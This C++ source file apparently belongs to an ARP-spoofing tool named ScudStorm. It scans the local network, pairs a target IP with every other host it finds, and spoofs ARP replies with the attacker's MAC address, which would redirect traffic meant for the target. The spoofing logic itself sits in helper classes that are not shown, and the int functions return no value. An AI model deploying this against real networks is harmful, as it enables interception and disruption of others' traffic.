#include "ScudStorm.hpp"

#include <vector>

#include "ARPScanner.hpp"
#include "ARPTarget.hpp"
#include "ARPConnection.hpp"

ScudStorm::ScudStorm(std::string ifName): locked(false), interfaceName(ifName), spoofer(interfaceName) {}

int ScudStorm::lockTarget(uint32_t targetIpAddr) {
  ArpScanner scanner;
  std::vector<ArpTarget> targets = scanner.arpScan(interfaceName);

  ArpTarget server(interfaceName, targetIpAddr);
  for(auto itr = targets.begin(); itr != targets.end(); ++itr) {
    if((*itr).getIPAddr() != targetIpAddr) {
      ArpConnection con(server, (*itr));
      spoofer.addConnection(con);
    }
  }
}

int ScudStorm::fire(ScudStorm::MessageHandler handler) {
  spoofer.spoof(ArpSpoofer::getMacForInterface(interfaceName));
}
